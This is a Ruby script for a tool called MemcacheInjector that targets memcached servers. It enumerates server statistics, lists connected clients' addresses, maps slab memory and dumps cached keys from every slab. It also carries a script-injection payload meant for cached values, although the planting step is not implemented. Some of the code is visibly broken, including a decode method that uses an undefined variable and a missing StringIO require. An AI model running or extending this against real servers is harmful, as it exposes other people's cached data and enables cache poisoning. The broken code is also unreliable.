require 'uri'
require 'zlib'
require 'socket'

class MemcacheInjector
  class SocketWrapper
    EOF   = "\r\nEND\r\n"
    ERROR = "ERROR"

    class Error < Exception; end

    def initialize(socket)
      @socket = socket
    end

    def write(data)
      @socket.write("#{data}\r\n")
    end

    def read
      String.new.tap do |data|
        loop do
          data << @socket.recv(1028)

          raise Error.new if data.include?(ERROR)
          break if data.include?(EOF)
        end
      end
    end

    def send(data)
      write(data)
      read[0..-8].split("\r\n")
    end

    def send_and_expect_list(data, delimiter)
      send(data).map do |item|
        item.split("#{delimiter.to_s.upcase} ")[1]
      end
    end
  end

  class NoOpEncoder
    def encode(data); data; end
    def decode(data); data; end
  end

  class GzipEncoder
    def encode(data)
      io = StringIO.new("w")
      Zlib::GzipWriter.new(io).write(data).close
      io.string
    end

    def decode(data)
      io = StringIO.new(data, "rb")
      Zlib::GzipReader.new(io).read
    end
  end

  class GlibEncoder
    def encode(data)
      Zlib::Deflate.deflate(data)
    end

    def decode
      Zlib::Inflate.inflate(data)
    end
  end

  def initialize(host, port, mode, payload, opts = {})
    @socket  = SocketWrapper.new(TCPSocket.new(host, port))
    @opts    = {
      encoder: NoOpEncoder.new,
      regex: nil,
      keys_per_slab: 10000
    }.merge(opts)
    @mode    = mode
    @payload = payload
    @conns   = Array.new
    @slabs   = Array.new
    @keys    = Array.new
  end

  def get_general_stats
    items = @socket.send_and_expect_list("stats", :stat)
    stats = {}

    items.each do |item|
      id, stat = item.split(' ', 2)

      if id && stat
        stats[id] = stat
      end
    end

    stats
  end

  def get_active_connections
    conns = get_stats_of_type(:conns)
    @conns << conns
    conns
  end

  def get_slab_info
    slabs = get_stats_of_type(:slabs)
    @slabs << slabs
    slabs
  end

  def dump_keys_from_slab(i)
    items = @socket.send_and_expect_list("stats cachedump #{i} #{@opts[:keys_per_slab]}", :item)
    keys = []

    items.each do |item|
      keys << item.split('ITEM ')[0].split(' ')[0]
    end

    @keys << keys
    keys
  end

  private

  def get_stats_of_type(type)
    items = @socket.send_and_expect_list("stats #{type.to_s}", :stat)
    stats = {}

    items.map do |item|
      stat = item.split(':', 2)

      next if stat.size != 2

      id  = stat[0].to_i
      val = stat[-1..1][0]
      val = val.split

      val_id   = val[0]
      val_data = val[-1..1].join(' ')

      stats[id] ||= Hash.new
      stats[id][val_id] = val_data
    end

    stats
  end
end

client = MemcacheInjector.new(ARGV[0], ARGV[1], :dump, "<script>alert('memcache_injector');</script>")
slabs  = Array.new

puts "\r\n"
puts "Starting MemcacheInjector..."

puts ""
puts "General Stats"
puts "-------------"

client.get_general_stats.each do |stat, val|
  puts "#{stat}: #{val}"
end

puts ""
puts "Active Connections"
puts "------------------"

client.get_active_connections.each do |i, stat|
  puts "#{stat['addr']} in #{stat['state']} state for #{stat['secs_since_last_cmd']}s"
end

puts ""
puts "Slab Stats"
puts "----------"

client.get_slab_info.each do |i, stat|
  slabs << i
  memory = stat['chunk_size'].to_i * stat['chunks_per_page'].to_i * stat['total_pages'].to_i
  puts "##{i}: #{stat['used_chunks']}/#{stat['total_chunks']} chunks (allocated #{memory}B)"
end

puts ""
puts "Dump Tool"
puts "---------"

slabs.each do |i|
  print "Starting dump of keys in slab ##{i}..."
  dump = client.dump_keys_from_slab(i)
  puts " Got #{dump.count} key(s)."
end

puts ""
puts "Finished running MemcacheInjector."
